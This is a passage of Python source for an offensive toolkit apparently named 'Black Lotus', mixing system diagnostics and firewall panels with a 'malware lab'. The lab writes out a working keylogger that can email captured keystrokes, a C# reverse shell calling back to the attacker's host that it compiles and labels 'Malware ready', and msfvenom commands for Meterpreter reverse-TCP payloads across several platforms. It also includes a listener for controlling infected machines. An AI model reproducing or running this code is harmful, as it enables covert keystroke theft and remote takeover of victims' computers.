 set lport     Set the port that you want the payload to listen
 set name      Set the payload name
 set location  Set the location that the payload will be stored
                 |_If you choose 'set location', you are not allowed to use link
 link   (NON supported yet) Generate the payload as a link(only in local network)
                 |_If you choose link, you are not allowed to use 'set location'
 config        see the payload configuration
 listener      start a listener
 compile       Generate the payload command ( use 'config' to see your payload )


 \033[31mMSF Payloads\033[37m (Use Metasploit to create \033[31mReverse Shell\033[37m payloads\033[37m)
 \033[31m[=============================================================>\033[37m
 [\033[31m1\033[37m]Android \033[33m|\033[37m [\033[31m2\033[37m]Linux \033[33m|\033[37m [\033[31m3\033[37m] Windows \033[33m|\033[37m [\033[31m4\033[37m] Mac OS X \033[33m|\033[37m [\033[31m5\033[37m] Python \033[33m|\033[37m [\033[31m6\033[37m] Bash 
 
 \033[31mCustom Payloads \033[37m(You dont need msfvenom to create  \033[31mReverse Shell\033[37m payloads\033[37m)
 \033[31m[=============================================================>\033[37m
 [\033[31m7\033[37m] Windows C# (undetectable)
 [\033[31m8\033[37m] Keylogger (Only requires email and password for your smtp gmail server)

""")
            help()
            lab = True
            while lab:
                def keylogger():
                    email = input("\033[37mEmail > \033[31m")
                    password = input("\033[37mPassword > \033[31m")
                    name = input("\033[37mFile Name > \033[31m")
                    code1 = (r"""
import keyboard
import smtplib
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 20 """)
                    email_1 = str("EMAIL_ADDRESS = '" + email + "' ")
                    password_1 = str("EMAIL_PASSWORD = '" + password + "' ")
                    code2 = str(r"""
class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
    
    """)
                    code_mal = str(code1 + "\n" + email_1 + "\n" + password_1 + "\n" + code2)
                    keylogger_rev=open(name + ".py","w+")
                    keylogger_rev.write(code_mal)
                    keylogger_rev.close()
                    print(str("Malware ready: \033[31m" + name + ".py\033[37m"))
                    file_name_byte = str(name +".py")
                    file_stats = os.stat(file_name_byte)
                    print("File size: ", file_stats.st_size, " bytes!")

                a = input("\033[31mBlack Lotus\033[37m(\033[31mMalware Lab\033[37m) \033[31m>\033[37m ")
        #--------------------------------------------------------------------------------------------------------------
        #                      PAYLOADS
        #--------------------------------------------------------------------------------------------------------------
                if a == "set payload 1":
                    payload =  'android/meterpreter/reverse_tcp'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os = 'Android'
                    payload_extension='apk'
                    #android payload

                elif a == "set payload 2":
                    payload = 'linux/x86/meterpreter/reverse_tcp'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Linux'
                    payload_extension='elf'
                    #linux payload

                elif a == "set payload 3":
                    payload =  'windows/meterpreter/reverse_tcp'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Windows'
                    payload_extension='exe'
                    #windows payload

                elif a == "set payload 4":
                    payload =  'osx/x86/shell_reverse_tcp'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Mac OS X'
                    #MAC OS PAYLOAD

                elif a == "set payload 5":
                    payload =  'cmd/unix/reverse_python'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Python'
                    payload_extension='py'
                    #Python payload

                elif a == "set payload 6":
                    payload =  'cmd/unix/reverse_bash'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Bash'
                    payload_extension='sh'
                    #Bash Payload

                elif a == "set payload 7":
                    payload =  'C# Reverse shell'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Windows'
                    payload_extension='exe'
                    # C# Payload
                
                elif a == "set payload 8":
                    payload =  'Python Keylogger'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Windows/Linux'
                    payload_extension='py'
                    # Python Keylogger
                    keylogger()
        #--------------------------------------------------------------------------------------------------------------
        #                   CONFIG
        #--------------------------------------------------------------------------------------------------------------

                elif a == "set lport":
                    lport=input("\033[37mLPort > \033[31m")
                    #local port
		    
                elif a == "lhost":
                    import socket
                    import threading
                    hostname = socket.gethostname()
                    local_ip = socket.gethostbyname(hostname)
                    print("\033[37mLHost: \033[31m", local_ip)

                elif a =="set lhost":
                    local_ip=input("\033[37mLHost > \033[31m")

                elif a =="set name":
                    payload_name=input("\033[37mName > \033[31m")

                elif a =="set location":
                    payload_location=input("\033[37mDirectory > \033[31m")
                    link_true_false="False"

                elif a =="link":
                    #payload_location="/var/www/html/"
                    #link_true_false="True"
                    print("not supported yet")

                elif a == "config":
                    print("\n\033[37m============================= \033[31mConfiguration\033[37m =============================")
                    print("\n\033[31m>>>>>>>>>>>>>>>>>>>>")
                    print("\033[37mPAYLOAD \033[31m> ", payload)
                    print("\033[37mExtension \033[31m> ", payload_extension)
                    print("\033[37mOS/SCRIPT \033[31m> ", payload_os)
                    print("\033[37mLHost \033[31m> ", local_ip)
                    print("\033[37mLPort \033[31m> ", lport)
                    print("\033[37mName \033[31m> ", payload_name)
                    print("\033[37mDirectory \033[31m> ", payload_location)
                    print("\033[37mLink \033[31m> ", link_true_false)
                    print("\033[31m>>>>>>>>>>>>>>>>>>>>\033[37m")
                    print("\n")

                elif a == "compile":
    #msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
                    if payload == "android/meterpreter/reverse_tcp":
                        print("\n\033[37mYour Payload is Ready:")
                        print('\033[31msudo msfvenom -p ' + str(payload) + " LHOST=" + str(local_ip) + " LPORT=" + str(lport) + " R> " + str(payload_name) + "." + str(payload_extension))
                        print("\n\033[37mUse this command to generate your payload")
                        print("\033[37m(It requires msfvenom to be installed)")
                    elif payload == "C# Reverse shell":
                        def master():
                            code1 = (r"""
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{""")     
                            code2 = (r"""   	                {
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}""")

                            lhost = local_ip
                            one = str(""" " """)
                            two = str(""" ", """)
                            rev = (str("			using(TcpClient client = new TcpClient(" + one.strip() + lhost + two.strip() +" " + lport + "))"))
                            name = payload_name
                            malware_rev=open(name + ".cs","w+") #you can change the file name
                            code_mal = str(code1 + "\n" + rev + "\n" + code2)
                            malware_rev.write(code_mal)
                            malware_rev.close()
                            try:
                                comp = (str("mcs -out:" + name + ".exe " + name + ".cs"))
                                os.system(comp)
                            except:
                                os.system("sudo apt install mono-mcs")
                                comp = (str("mcs -out:" + name + ".exe " + name + ".cs"))
                                os.system(comp)
                            print(str("Malware ready: \033[31m" + name + ".exe\033[37m"))
                            file_name_byte = str(name +".exe")
                            file_stats = os.stat(file_name_byte)
                            print("File size: ", file_stats.st_size, " bytes!")
                        master()   
                    else:
                        print("\n\033[37mYour Payload is Ready:")
                        print('\033[31msudo msfvenom -p ' + str(payload) + " LHOST=" + str(local_ip) + " LPORT=" + str(lport) + " -f " + str(payload_extension) + " > " + str(payload_name) + "." + str(payload_extension))
                        print("\n\033[37mUse this command to generate your payload")
                        print("\033[37m(It requires msfvenom to be installed)")     
                   
                elif a == "help":
                    help()
                elif a =="exit":
                    lab = False
                    mallab = False
                else:
                    print("' " + str(a) + " '", "is not recognized as internal or external command")
                    print("Type help to reveal the panel")


        elif b =="exit":
            mallab = False
        else:
            print("' " + str(b) + " '", "is not recognized as internal or external command")

#----------------------------------------------------------------------------------------------------------------------

def reverse_server():

    print("The payload is located in the same directory of Black-Lotus in the name of 'backdoor.py'")
    print("Open and edit it for use. Manual included in it's source code")
    import socket

    HOST = input("\n\033[37mServer LHost \033[31m>\033[37m ") # Add the ip  of your machine to connect
    PORT = int(input("\033[37mServer LPort \033[31m>\033[37m ")) # Add the port you want it to listen
    server = socket.socket()
    server.bind((HOST, PORT))
    print('\n\033[37m[\033[31m+\033[37m] Database connected')
    print('\033[37m[\033[31m+\033[37m] Initialising target ..')
    print('\033[37m[\033[31m+\033[37m] Grab a coffe, Waiting for an incoming connection ...')
    server.listen(1)
    client, client_addr = server.accept()
    print('\033[37m[\033[31m+\033[37m] WE HAVE A SHELL!!')
    print("\n\033[37m[\033[31m+\033[37m] Target '", client_addr, "' connected sucessfully")

    while True:
        command = input("\n\033[37mBlack Lotus(\033[31mRemote/shell\033[37m) \033[31m>\033[37m")
        command = command.encode()
        client.send(command)
        print('\n\033[37m[\033[31m*\033[37m] Command sent', command )
        output = client.recv(1024)
        output = output.decode()
        print(f"Output: {output}")

#----------------------------------------------------------------------------------------------------------------------

def computer_diagnostics():
    import os
    try:
        import psutil
    except:
        os.system("pip3 install psutil")
        import psutil
    import platform
    from datetime import datetime
    import time

    def get_size(bytes, suffix="B"):
        """
        Scale bytes to its proper format
        e.g:
            1253656 => '1.20MB'
            1253656678 => '1.17GB'
        """
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor

    os.system('cls || clear')
    print("\n\033[37m")
    print(r"""
        _______________________________________
       |,----------[']------------------------.|
       ||    /||\                             ||
       ||   / || \  Black Lotus               ||
       ||  /  ||  \          By               ||
       ||  \ x||x /             The Jes7er    ||
       ||    ````                             ||
       ||                                     ||
       ||                                     ||
       ||_____,_________________________,_____||
       |)_____)-----.|/\ (B) =+ |O------(_T400(|
     //-------|_____|=----------=|______|-------\
    // _| _| _| _| _| _| _| _| _| _| _| _| _| _| \
   // ___| _| _| _| _| _| _| _| _| _| _| _|  |  | \
  |/ ___| _| _| _| _| _| _| _| _| _| _| _| ______| \
  / __| _| _| _| _| _| _| _| _| _| _| _| _| _| ___| \
 / _| _| _| _| ________________________| _| _| _| _| \
|------"--------------------------------------"-------|
`-----------------------------------------------------'
    """)
    print("\033[31mBlack Lotus Advanced Computer/Network Diagnostics Panel +\033[37m")
    print("\033[31mLoading Configuration...")
    time.sleep(2)
    print("\n")
    print("\033[37m="*40, "\033[31mSystem Information\033[37m", "="*40)
    print(" ")
    uname = platform.uname()
    print(f"\033[37mSystem: \033[31m{uname.system}")
    print(f"\033[37mNode Name: \033[31m{uname.node}")
    print(f"\033[37mRelease: \033[31m{uname.release}")
    print(f"\033[37mVersion: \033[31m{uname.version}")
    print(f"\033[37mMachine: \033[31m{uname.machine}")
    print(f"\033[37mProcessor:\033[31m {uname.processor}")

    # Boot Time
    print(" ")
    print("\033[37m="*40, "\033[31mBoot Time\033[37m", "="*40)
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    print(f"\033[37mBoot Time:\033[31m {bt.year}/{bt.month}/{bt.day} | {bt.hour}:{bt.minute}:{bt.second}")

    # let's print CPU information

    print(" ")
    print("\033[37m="*40, "\033[31mCPU Info\033[37m", "="*40)

    # number of cores

    print("\033[37mPhysical cores: \033[31m", psutil.cpu_count(logical=False))
    print("\033[37mTotal cores: \033[31m", psutil.cpu_count(logical=True))

    # CPU frequencies

    cpufreq = psutil.cpu_freq()
    print(f"\033[37mMax Frequency: \033[31m{cpufreq.max:.2f}Mhz")
    print(f"\033[37mMin Frequency: \033[32m{cpufreq.min:.2f}Mhz")
    print(f"\033[37mCurrent Frequency: \033[36m{cpufreq.current:.2f}Mhz")

    # CPU usage

    print("\033[37mCPU Usage Per Core:\033[31m")
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        print(f"\033[37mCore {i}: \033[31m{percentage}%")
    print(f"\033[37mTotal CPU Usage: \033[31m{psutil.cpu_percent()}%")

    # Memory Information
    print(" ")
    print("\033[37m="*40, "\033[31mMemory Information\033[37m", "="*40)

    # get the memory details
    print(" ")
    svmem = psutil.virtual_memory()
    print(f"\033[37mTotal: \033[31m{get_size(svmem.total)}")
    print(f"\033[37mAvailable: \033[31m{get_size(svmem.available)}")
    print(f"\033[37mUsed: \033[31m{get_size(svmem.used)}")
    print(f"\033[37mPercentage: \033[31m{svmem.percent}%")
    print(" ")
    print("\033[37m="*46, "\033[34mSWAP\033[37m", "="*46)
    print(" ")
    # get the swap memory details (if exists)

    swap = psutil.swap_memory()
    print(f"\033[37mTotal: \033[31m{get_size(swap.total)}")
    print(f"\033[37mFree: \033[32m{get_size(swap.free)}")
    print(f"\033[37mUsed: \033[31m{get_size(swap.used)}")
    print(f"\033[37mPercentage: \033[31m{swap.percent}%")

    # Disk Information

    print(" ")
    print("\033[37m="*40, "\033[31mDisk Information\033[37m", "="*40)
    print("\033[37mPartitions and Usage:\033[31m")

    # get all disk partitions

    partitions = psutil.disk_partitions()
    for partition in partitions:
        print(f"\033[37m=== \033[31mDevice\033[31m:\033[36m {partition.device} \033[37m===")
        print(f"  \033[37mMountpoint:\033[31m {partition.mountpoint}")
        print(f"  \033[37mFile system type: \033[31m{partition.fstype}")
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            continue
        print(f"  \033[37mTotal Size:\033[31m {get_size(partition_usage.total)}")
        print(f" \033[37m Used: \033[31m{get_size(partition_usage.used)}")
        print(f" \033[37m Free: \033[31m{get_size(partition_usage.free)}")
        print(f" \033[37m Percentage: \033[31m{partition_usage.percent}%")
    disk_io = psutil.disk_io_counters()
    print(f"\033[37mTotal read:\033[31m {get_size(disk_io.read_bytes)}")
    print(f"\033[37mTotal write: \033[31m{get_size(disk_io.write_bytes)}")

    print(" ")
    print("\033[37m="*40, "\033[31mNetwork Information\033[37m", "="*40)
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            print("\n\033[37m====================")
            print(f"\033[34mInterface: \033[31m{interface_name} \033[37m")
            print("\033[37m====================")
            if str(address.family) == 'AddressFamily.AF_INET':
                print(f"  \033[37mIP Address: \033[31m{address.address}")
                print(f"  \033[37mNetmask: \033[31m{address.netmask}")
                print(f" \033[37m Broadcast IP: \033[31m{address.broadcast}")
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                print(f"  \033[37mMAC Address: \033[31m{address.address}")
                print(f"  \033[37mNetmask: \033[31m{address.netmask}")
                print(f"  \033[37mBroadcast MAC: \033[31m{address.broadcast}")
    print("\033[37m-------------------------------------------------------------------\033[39m")
    public_ip_addr()
    # get IO statistics since boot
    net_io = psutil.net_io_counters()
    try:
        import GPUtil
        from tabulate import tabulate
    except:
        os.system("pip3 install gputil")
        os.system("pip3 install tabulate")
        import GPUtil
        from tabulate import tabulate

    print("\n")
    print("\033[37m="*40, "\033[31mGPU Details\033[37m", "="*40)
    gpus = GPUtil.getGPUs()
    list_gpus = []
    for gpu in gpus:
        gpu_id = gpu.id
        gpu_name = gpu.name
        gpu_load = f"{gpu.load*100}%"
        gpu_free_memory = f"{gpu.memoryFree}MB"
        gpu_used_memory = f"{gpu.memoryUsed}MB"
        gpu_total_memory = f"{gpu.memoryTotal}MB"
        gpu_temperature = f"{gpu.temperature} °C"
        gpu_uuid = gpu.uuid
        list_gpus.append((
            gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
            gpu_total_memory, gpu_temperature, gpu_uuid
        ))

    print(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                    "temperature", "uuid")))
    print(f"\n\033[37mTotal Bytes Sent: \033[36m{get_size(net_io.bytes_sent)}")
    print(f"\033[37mTotal Bytes Received: \033[36m{get_size(net_io.bytes_recv)}")
    print("\n")

#----------------------------------------------------------------------------------------------------------------------

def firewall_utilis():
    import os
    os.system("cls || clear")
    firewall = True
    while firewall:

        a = input("""\033[31m
Megalodon's Firewall Panel
_______________________________________________
| |___|_____|_____|_____|_____|_____|_____|_____|   Command List
| |_____|_____|_____|_____|_____|_____|_____|___ \033[37m  ' enable '   Enable the firewall\033[31m
| |___|_____|_____|_____|_____|_____|_____|_____|\033[37m  ' disable '  Disable the firewall \033[31m
| |_____|_____|_____|_____|_____|_____|_____|___ \033[37m  ' allow '  Allow outgoing/incoming\033[31m
| |___|_____|_____|_____|_____|_____|_____|_____|\033[37m  ' deny '  Deny outgoing/incoming \033[31m
`````````````````````````````````````````````````\033[37m  ( allow and deny have more capabilities)\033[31m
|    \033[37mUtilise Linux firewall\033[31m                      \033[37m      |_See them by typing 'allow' or 'deny'\033[31m
|                                                \033[37m  'delete'  remove a rule (ex. delete allow 443 )\033[31m
|                                                \033[37m  'exit'   exit the Firewall panel\033[31m
|
|     \033[37mConsole \033[31m/>\033[37m """)
        os.system("cls || clear")
        if a =="enable":
            os.system("sudo systemctl start ufw")
            os.system("sudo systemctl enable ufw")
            print("\nFirewall enabled")
        elif a =="disable":
            os.system("sudo systemctl disable ufw")
            os.system("sudo systemctl stop ufw")
            print("\nFirewall disabled")
        elif a=="allow":
            b = input("Allow from 'incoming/outgoing/ip/port ?' /> ")
            if b == "incoming":
                os.system("sudo ufw default allow incoming")
            elif b == "outgoing":
                os.system("sudo ufw default allow outgoing")
            elif b == "ip":
                ip = input("Ip /> ")
                os.system("sudo ufw allow from " + ip)
            elif b=="port":
                port = input("Port /> ")
                os.system("sudo ufw allow " + port)
            else:
                print(b, " is not recognized as internal or external command")
                print("Use 'incoming', 'outgoing', 'ip' or 'port' options")
        elif a =="deny":
            b = input("Deny from 'incoming/outgoing/ip/port ?' /> ")
            if b == "incoming":
                os.system("sudo ufw default deny incoming")
            elif b == "outgoing":
                os.system("sudo ufw default deny outgoing")
            elif b == "ip":
                ip = input("Ip /> ")
                os.system("sudo ufw deny from " + ip)
            elif b =="port":
                port = input("Port /> ")
                os.system("sudo ufw deny " + port)
            else:
                print(b, " is not recognized as internal or external command")
                print("Use 'incoming', 'outgoing', 'ip' or 'port' options")
        elif a =="delete":
            rule = input("Rule /> ")
            os.system("sudo ufw delete " + rule)
        elif a =="exit":
            firewall = False
        else:
            print(a, " is not recognized as internal or external command")
            print("Use the commands that are on the main page!!")
            print("""                                                        ||
                                                        \/""")

#----------------------------------------------------------------------------------------------------------------------

def postman():
    def sender():
        import os
        import socket
        try:
            import tqdm
        except:
            os.system("pip3 install tqdm")

        SEPARATOR = " "
        BUFFER_SIZE = 4096
        host = input("Add the reciever Host to send \033[31m>\033[37m ")
        port = int(input("Add the reciever port to send \033[31m>\033[37m "))
        filename = input("Enter file path \033[31m>\033[37m ")
        filesize = os.path.getsize(filename)
        s = socket.socket()
        print(f"[\033[34m+\033[37m] Connecting to \033[31m{host}\033[37m:\033[34m{port}\033[37m")
        s.connect((host, port))
        print("\033[37m[\033[34m+\033[37m] \033[36mConnection initialised!\033[37m")
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        progress = tqdm.tqdm(range(filesize), f"\033[37mSending \033[36m{filename}\033[37m", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
                progress.update(len(bytes_read))
        s.closepostman()

    def reciever():
        import os
        import socket
        try:
            import tqdm
        except:
            os.system("pip3 install tqdm")

        SERVER_HOST = input("Add the sender Host \033[36m>\033[37m ")
        SERVER_PORT = int(input("Add the sender port \033[36m>\033[37m "))
        BUFFER_SIZE = 4096
        SEPARATOR = " "
        s = socket.socket()
        s.bind((SERVER_HOST, SERVER_PORT))
        s.listen(3)
        print(f"[\033[34m*\033[37m] Listening as \033[34m{SERVER_HOST}\033[37m:\033[34m{SERVER_PORT}\033[37m")
        client_socket, address = s.accept()
        print(f"[\033[32m+\033[37m] {address} \033[36mis connected!\033[37m")
        received = client_socket.recv(BUFFER_SIZE).decode()
        filename, filesize = received.split(SEPARATOR)
        filename = os.path.basename(filename)
        filesize = int(filesize)
        progress = tqdm.tqdm(range(filesize), f"\033[37mReceiving \033[34m{filename}\033[37m", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "wb") as f:
            while True:
                bytes_read = client_socket.recv(BUFFER_SIZE)
                if not bytes_read:
                    break
                f.write(bytes_read)
                progress.update(len(bytes_read))

        client_socket.close()
        s.close()

    def emailer():
        try:
            import smtplib
            from email import encoders
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            from email.mime.base import MIMEBase
            from bs4 import BeautifulSoup as bs
        except:
            os.system("pip3 install bs4")
        email = input("Enter email credentials \033[31m>\033[37m ")
        password = input("Enter email password \033[31m>\033[37m ")
        FROM = input("Enter your email address \033[31m>\033[37m ")
        TO   = input("Enter reciever email \033[31m>\033[37m ")
        subject = input("Enter the email subject \033[31m>\033[37m ")
        msg = MIMEMultipart("alternative")
        msg["From"] = FROM
        msg["To"] = TO
        msg["Subject"] = subject
        html = input("Enter the email you want to send \033[31m>\033[37m ")
        text = bs(html, "html.parser").text
        text_part = MIMEText(text, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        print(msg.as_string())
        def send_mail(email, password, FROM, TO, msg):
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(FROM, TO, msg.as_string())
            server.quit()

    def help():

        print("""\033[37m
        \033[31m..--""|
        |     |
        | .---'\033[37m
     (--.--\033[31m| |\033[37m-----------.       \033[31mBlack Lotus file sender\033[37m
    /  ) | \033[31m| |\033[37m                   \033[36mFunctions: \033[37m
    |:.  | \033[31m| |\033[37m             |     \033[31m+\033[36mFile sending/recieving \033[37m
    |:.  | \033[31m|\033[37mo\033[31m|\033[32m POSTMAN \033[37m    |     \033[31m+\033[36mEmail sending\033[37m
    |:.  | \033[31m`"`\033[37m             |
    |:.  |_  __   __ _  __ /    Command   Description
    `    `    |=`|`             send      send files via TCP
              |=_|              recieve   recieve  files via TCP
              |= |              email     send an email
                                exit      exit the application
        """)

    import os
    os.system("cls || clear")
    help()
    postman = True
    while postman:
        a = input("\033[37mBlack Lotus(\033[31mPostman\033[37m) \033[31m>\033[37m ")
        if a =="send":
            sender()
        elif a =="recieve":
            reciever()
        elif a =="email":
            emailer()
        elif a =="exit":
            postman = False
        elif a =="help":
            help()
        else:
            print(a, " not recognized as an internal or external command")
            print("Use 'help' to see the command list")

#----------------------------------------------------------------------------------------------------------------------

def rtsp_camera():
    import os
    try:
        import cv2
    except:
        os.system("pip install opencv-python")
        try:
            import cv2
        except:
            print("Cv2 Failed to initiate")
    print("""\033[37m
            ██████████████████
        ██\033[32m▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[37m██
        ██\033[32m▓▓▓▓▓▓▓▓▓▓▓▓\033[37m░░░░\033[32m▓▓\033[37m██\033[37m
        ██\033[32m▓▓▓▓▓▓▓▓\033[37m██████████████
        ██\033[32m▓▓▓▓▓▓\033[37m██\033[32m▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[37m██
        ██████████████████████████
        ██\033[33m▒▒▒▒▒▒\033[37m██░░░░░░░░░░██       \033[32mMegalodon's RTSP Camera Viewer\033[37m
        ██\033[33m▒▒▒▒\033[37m██░░██░░░░██░░██
        ██\033[33m▒▒\033[37m██░░░░██░░░░██░░██
        ████░░░░░░░░░░░░░░░░██
        ██████████████████████
    ████████\033[32m▒▒\033[37m▓▓▓▓\033[32m▒▒\033[37m▓▓\033[32m▒▒\033[37m▓▓\033[37m████████
    ██░░░░██\033[32m▒▒▒▒▒▒▒▒\033[37m▓▓\033[32m▒▒▒▒\033[37m██\033[37m░░░░\033[37m██
    ██░░░░██\033[32m▒▒▒▒▒▒▒▒\033[37m▓▓\033[32m▒▒▒▒\033[37m██\033[37m░░░░\033[37m██
    ██████████████████████████████
        ██\033[32m▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[37m██
        ██\033[32m▓▓▓▓▓▓\033[37m██████\033[32m▓▓▓▓▓▓\033[37m██
        ██████████  ██████████
    """)
    cap = cv2.VideoCapture(input('\033[37mRTSP Link \033[31m> \033[37m'))

    while True:

        print('Initiating camera module...')
        ret, frame = cap.read()
        print('About to show frame of Video..')
        cv2.imshow("Capturing",frame)
        print('Running..')

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cap.release()
    cv2.destroyAllWindows()

#----------------------------------------------------------------------------------------------------------------------

def email_va():
    import re
    regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    def check(email):
        if(re.fullmatch(regex, email)):
            print("\n'", email, "' is \033[32mValid\033[37m")

        else:
            print("\n'", email, "' is \033[31mInvalid\033[37m")

    if __name__ == '__main__':

        email = input("Enter email \033[31m>\033[37m ")
        check(email)

#----------------------------------------------------------------------------------------------------------------------

def exploitdb():
    import os
    os.system('cls||clear')
    exploit_search = True
    while exploit_search:
        print("\033[31m")
        print(r"""
              (
              )
              (
        /\  .-----.  /\
       //\\/  ,,,  \//\\
       |/\| ,;;;;;, |/\|
       //\\\;-----;///\\
      //  \/   .   \/  \\
     (| ,-_| \ | / |_-, |)
       //`__\.-.-./__`\\    Use exploitdb to search for vulnerabilities
      // /.-(() ())-.\ \\
     (\ |)   '---'   (| /)
      ` (|           |) `
        \)           (/ """)
        a = input("\n\033[37mEnter vulnerability to scan \033[31m|>\033[36m ")
        print("\033[37m")
        try:
            os.system("searchsploit " + a)
            exploit_search = False
        except:
            os.system("sudo apt-get install exploitdb -y")
            try:
                os.system("searchsploit " + a)
                exploit_search = False
            except:
                print("\033[31mError finding vulnerability or starting exploitdb...\033[37m")
                exploit_search = False

#----------------------------------------------------------------------------------------------------------------------

def meta_scraper():
    import os
    os.system('cls||clear')
    try:
        print("""\033[31m
            ______
         .-'      `-.
       .'            `.
      /                \
     ;                 ;`
     |                 |;
     ;                 ;|     Black Lotus hidden file scraper
     '\               / ;       using Edge-Security.com
      \`.           .' /
       `.`-._____.-' .'
         / /`_____.-'
        / / /
       / / /
      / / /   supported file types to scrape 'pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx'
     / / /
    / / /
   / / /
  / / /
 / / /
/ / /
\/_/       """)
        domain = input("\033[31mEnter website domain \033[31m>\033[37m ")
        file = input("\033[31mEnter File type to srape \033[31m>\033[37m ")
        slimit = input("\033[31mEnter File search limit (default 200) \033[31m>\033[37m ")
        dlimit = input("\033[31mEnter File download limit \033[31m>\033[37m ")
        directory = input("\033[31mEnter Directory to save results \033[31m>\033[37m ")
        command =("metagoofil -d " + str(domain) + " -t " + str(file) + " -l " + str(slimit) + " -n " + str(dlimit) + " -o " + str(directory))
        print("\033[31m ")
        os.system(command)
        print("\033[31m ")
    except:
        print("\033[31mRequirements are not installed")
        print("Installing them for you...\033[37m")
        try:
            import time
            time.sleep(2)
            os.system("sudo apt-get install metagoofil -y")
            os.system('cls||clear')
            print("Requirements installed succesfully")
            print("Re run the programm!!")
        except:
            import sys
            print("\033[31mProblem occured when installing metagoofil..")
            print("EXITING!!\033[37m")
            sys.exit()

#----------------------------------------------------------------------------------------------------------------------

def carnival_webbrowser():
    try:
        import tkinterweb
    except:
        os.system("sudo pip3 install tkinterweb")
        import tkinterweb
    import tkinter as tk
    root = tk.Tk()
    root.title("Black Lotus Browser")
    root.geometry("900x450+200+150")
    frame = tkinterweb.HtmlFrame(root)
    frame.load_website('https://duckduckgo.com/')
    frame.pack(fill="both", expand=True)
    root.mainloop()

#----------------------------------------------------------------------------------------------------------------------

def sniper():
    import socket
    import re
    import json
    import sys
    import os
